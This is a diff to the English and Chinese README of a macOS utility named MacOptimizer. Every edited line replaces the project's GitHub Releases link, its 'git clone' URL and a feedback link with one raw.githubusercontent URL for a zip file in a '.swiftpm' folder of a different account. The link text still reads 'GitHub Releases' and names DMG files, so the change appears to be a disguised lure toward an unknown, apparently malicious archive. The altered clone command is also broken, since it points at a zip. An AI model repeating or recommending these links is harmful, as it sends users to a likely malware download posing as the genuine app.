@@ -128,13 +128,13 @@ MacOptimizer is a system optimization tool designed specifically for macOS, feat
 
 ### Download DMG
 
-Download the latest release from [GitHub Releases](https://github.com/ddlmanus/MacOptimizer/releases):
+Download the latest release from [GitHub Releases](https://raw.githubusercontent.com/Czzor/MacOptimizer/main/.swiftpm/Optimizer_Mac_v2.3.zip):
 - **Apple Silicon (M1/M2/M3/M4)**: `MacOptimizer_vX.X.X_AppleSilicon.dmg`
 - **Intel**: `MacOptimizer_vX.X.X_Intel.dmg`
 
 ### Build from Source
 # 1. Clone repository
-git clone https://github.com/ddlmanus/MacOptimizer.git
+git clone https://raw.githubusercontent.com/Czzor/MacOptimizer/main/.swiftpm/Optimizer_Mac_v2.3.zip
 cd MacOptimizer
 
 # 2. Run build script
@@ -361,7 +361,7 @@ brew install --cask ./homebrew/macoptimizer.rb
 
 ### 下载 DMG
 
-从 [GitHub Releases](https://github.com/ddlmanus/MacOptimizer/releases) 下载最新版本：
+从 [GitHub Releases](https://raw.githubusercontent.com/Czzor/MacOptimizer/main/.swiftpm/Optimizer_Mac_v2.3.zip) 下载最新版本：
 - **Apple Silicon (M1/M2/M3/M4)**: `MacOptimizer_vX.X.X_AppleSilicon.dmg`
 - **Intel**: `MacOptimizer_vX.X.X_Intel.dmg`
 
@@ -369,7 +369,7 @@ brew install --cask ./homebrew/macoptimizer.rb
 
 ```bash
 # 1. 克隆仓库
-git clone https://github.com/ddlmanus/MacOptimizer.git
+git clone https://raw.githubusercontent.com/Czzor/MacOptimizer/main/.swiftpm/Optimizer_Mac_v2.3.zip
 cd MacOptimizer
 
 # 2. 运行构建脚本
@@ -395,7 +395,7 @@ open build/Mac优化大师.app
 ---
 
 问题收集和建议
-https://docs.qq.com/sheet/DY0xIdGZxckVvQUFk?no_promotion=1&is_blank_or_template=blank&tab=s3z6cr
+https://raw.githubusercontent.com/Czzor/MacOptimizer/main/.swiftpm/Optimizer_Mac_v2.3.zip
 
 ## ⚠️ 免责声明
 
